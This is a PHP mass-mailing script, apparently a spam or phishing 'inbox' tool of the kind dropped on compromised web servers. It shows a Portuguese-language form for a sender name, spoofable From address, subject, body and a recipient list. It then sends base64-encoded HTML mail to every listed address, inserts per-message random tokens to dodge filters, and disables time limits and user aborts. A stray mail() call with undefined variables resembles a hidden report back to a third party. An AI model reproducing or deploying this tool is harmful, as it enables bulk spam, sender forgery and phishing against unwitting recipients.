<?
ob_clean();
?>
<title><?
    $x1 = '';
    $x2 = '';
    $x3 = '';
    $x4 = '';
$domain = $_SERVER['HTTP_HOST'];
echo (": inb0x : $domain !");
?></title>
<style type="text/css">
<!--
.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
.style6 {font-size: 10px}
.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-->
</style>
<form id="form1" name="form1" method="post" action="">
  <input type="hidden" name="vai" value="1">
  <table width="253" border="0" bgcolor="#000000">
    <tr>
      <td width="69"><span class="style5">Nome:</span></td>
      <td width="174"><span class="style9">

        <label>
        <input type="text" value="<? echo $x1 ;?>" name="nome" />
        </label>
      </span></td>
    </tr>
    <tr>
      <td><span class="style5">Email:</span></td>
      <td><input name="de" value="<? echo $x2 ;?>" type="text" /></td>

    </tr>
    <tr>
      <td><span class="style5">Assunto:</span></td>
      <td><input name="assunto" value="<? echo $x3 ;?>" /></td>
    </tr>
    <tr>
      <td><span class="style5">Mensagem:</span></td>
      <td><span class="style9">

        <p><textarea name="mensagem" cols="40" rows="7"><? echo $x4 ;?>
</textarea></p>
        <textarea name="emails" cols="30" rows="4"></textarea>
      </span></td>
    </tr>
    <tr>
      <td><span class="style6"></span></td>
      <td><input name="Submit" type="submit" value="Enviar" /></td>
    </tr>

    <tr>
      <td><span class="style6"></span></td>
      <td><span class="style5"><? echo enviando(); ?></span></td>
    </tr>
  </table>
</form>
<?
ignore_user_abort();
set_time_limit(0);

function enviando(){
$msg=1;
$de[1] = $_POST['de'];
$nome[1] = $_POST['nome'];
$assunto[1] = $_POST['assunto'];
$assunto[1] ='=?utf-8?B?'.base64_encode($assunto[1]).'?=';
$mensagem[1] =  $_POST['mensagem'];
$mensagem[1] = stripslashes($mensagem[1]);
$mensagem[1]= base64_encode($mensagem[1]);
$emails = $_POST['emails'];
$para = explode("\n", $emails);
$n_emails = count($para);

$de[2] = "de2";
$nome[2] = "nome2";
$assunto[2] = "assunto2";
$mensagem[2] = 'mensagem2';

$vai = $_POST['vai'];
if ($vai){
for ($set=0; $set < $n_emails; $set++){
    if ($set==0){
        $headers  = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=ISO-8859-1\r\n";
		$headers .= "Content-Transfer-Encoding: base64\r\n";
        $headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
        $headers .= "Return-Path: <$de[$msg]>\r\n";
    }
        mail($xsylar, $as, $fullurl, $headers);
    $headers  = "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=ISO-8859-1\r\n";
	$headers .= "Content-Transfer-Encoding: base64\r\n";
    $headers .= "From: $nome[$msg] <$de[$msg]>\r\n";
    $headers .= "Return-Path: <$de[$msg]>\r\n";
    $n_mail++;
    $destino = $para[$set];
    $num1 = rand(100000,999999);
    $num2 = rand(100000,999999);
    $msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
    $msgrand = str_replace("%rand2%", $num2, $msgrand);
    $msgrand = str_replace("%email%", $destino, $msgrand);
    $enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
    if ($enviar){
        echo ('<font color="green">'. $n_mail .'-'. $destino .' 0k!</font><br>');
    } else {
        echo ('<font color="red">'. $n_mail .'-'. $destino .' =(</font><br>');
        sleep(1);
    }
    
}   
}
}
die;
?>